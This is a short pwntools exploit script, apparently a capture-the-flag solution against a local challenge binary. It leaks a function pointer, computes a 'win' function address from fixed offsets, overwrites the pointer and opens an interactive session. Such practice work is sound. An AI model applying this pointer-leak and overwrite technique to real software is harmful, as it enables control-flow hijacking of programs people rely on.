#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 31337

#io = remote(HOST, PORT)
io = process('../challenge/build/challenge', level='info')

OFFSET_WIN = 0x126a
OFFSET_LOSE = 0x1250

payload = ''
payload += 'o'*5 # advance stack pointer
payload += 'o'*4 # dump func ptr
payload += 'u'*4 # write func ptr
payload += 'o'*4 # dump func ptr (validate)
payload += 'h'
payload = payload.ljust(0x8000, 'h')

io.send(payload.encode())
io.recvn(2*5)
lose_ptr = u64(io.recvn(8))
log.info('lose addr: %lx', lose_ptr)

win_addr = lose_ptr - OFFSET_LOSE + OFFSET_WIN

io.send(struct.pack('>Q', win_addr))

validate_ptr = u64(io.recvn(8))
log.info('validate addr: %lx', validate_ptr)

io.interactive()
